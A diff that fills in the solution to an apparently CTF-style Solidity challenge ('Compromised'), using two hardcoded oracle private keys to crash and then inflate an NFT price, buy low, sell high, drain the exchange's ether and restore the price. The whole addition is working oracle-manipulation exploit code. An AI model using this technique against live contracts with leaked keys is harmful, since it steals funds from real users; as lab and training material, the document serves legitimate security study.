@@ -75,7 +75,32 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        vm.broadcast(0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744);
+        oracle.postPrice(symbols[0], 0);
+
+        vm.broadcast(0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159);
+        oracle.postPrice(symbols[0], 0);
+
+        vm.prank(player);
+        uint256 id = exchange.buyOne{value: 0.01 ether}();
+
+        vm.broadcast(0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744);
+        oracle.postPrice(symbols[0], address(exchange).balance);
+
+        vm.broadcast(0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159);
+        oracle.postPrice(symbols[0], address(exchange).balance);
+
+        vm.startPrank(player);
+        nft.approve(address(exchange), id);
+        exchange.sellOne(id);
+        payable(recovery).transfer(999 ether);
+        vm.stopPrank();
+
+        vm.broadcast(0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744);
+        oracle.postPrice(symbols[0], 999 ether);
+
+        vm.broadcast(0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159);
+        oracle.postPrice(symbols[0], 999 ether);
     }
 
     /**
